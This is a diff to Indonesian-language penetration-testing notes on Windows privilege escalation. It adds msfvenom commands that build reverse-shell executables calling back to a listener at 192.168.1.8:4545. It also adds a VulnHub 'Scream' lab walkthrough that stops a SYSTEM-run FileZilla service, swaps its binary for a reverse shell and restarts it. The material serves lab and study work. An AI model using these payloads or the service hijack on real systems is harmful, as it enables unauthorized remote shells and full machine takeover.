@@ -1,10 +1,24 @@
 # Windows Privilege Escalation
 
+## MSFVENOM
+### 32 Bit
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.8 LPORT=4545 -f exe -o rev.exe
+```
+
+### 64bit
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.8 LPORT=4545 -f exe -o rev.exe
+```
+
+
 ## Insecure Service Permissions
 Service merupakan program-program pada windows yang dijalankan pada background. Terkadang menerima input atau menjalankan sebuah task
 Jika sebuah **service** dijalankan dengan privileges **SYSTEM** dan terdapat misconfiguration, maka kita bisa melakukan priv esc. 
 
 ### Recon
+* Untuk melihat nama service gunakan perintah `net start` atau bisa menggunakan winpeas. Hasil dari `net start` akan menampilkan nama-nama service yang bisa kita `net start` atau `net stop`
 * Query untuk melihat konfigurasi dari service --> `sc.exe qc <name>`
 * Melihat status service --> `sc.exe query <name>`
 * Modifikasi configurasi dari sebuah service --> `sc.exe config <name> <option>= <value>` (pastikan value ada spasi di depan)
@@ -656,6 +670,48 @@ Command diatas digunakan untuk melihat program dijalankan oleh siapa, dalam hal 
 Jika RDP tersedia, maka kita bisa buka mspaint.exe lalu open file cmd, maka kita akan membuka cmd sebagai administrator.
 
 ![[insecureGui.PNG]]
+
+### Studi Kasus Scream (VulnHub)
+Terdapat aplikasi yang dijalankan oleh Administrator, dan kita memiliki hak akses untuk `net start` dan `net stop`
+
+Pertama cari dulu tasklist yang dijalankan oleh administrator
+
+```
+tasklist /FI "username eq SYSTEM"
+```
+
+Hasilnya
+```
+FileZilla server.exe         296 Console                 0      3,312 K
+FreeSSHDService.exe          316 Console                 0      4,724 K
+OpenTFTPServerMT.exe         428 Console                 0      2,124 K
+```
+
+Lalu lihat nama service
+```
+net start
+```
+Hasilnya
+```
+   Fast User Switching Compatibility
+   FileZilla Server FTP server
+   FreeSSHDService
+   Help and Support
+
+```
+
+Ada service dengan nama `FileZilla Server FTP server`, kita stop service tersebut
+
+```
+net stop "FileZilla Server FTP server"
+```
+
+Lalu replace `FileZilla server.exe` dengan file reverse shell
+```
+move "FileZilla server.exe" Filezilla.exe.backup
+C:\Users\alex\Desktop\hijackme.exe "FileZilla server.exe"
+net start "FileZilla Server FTP server"
+```
 
 ## Startup Apps
 Setiap user dapat menentukan aplikasi apa aja yang otomatis dijalankan ketika mereka login dengan cara menempatkan shortcut pada directory tertentu
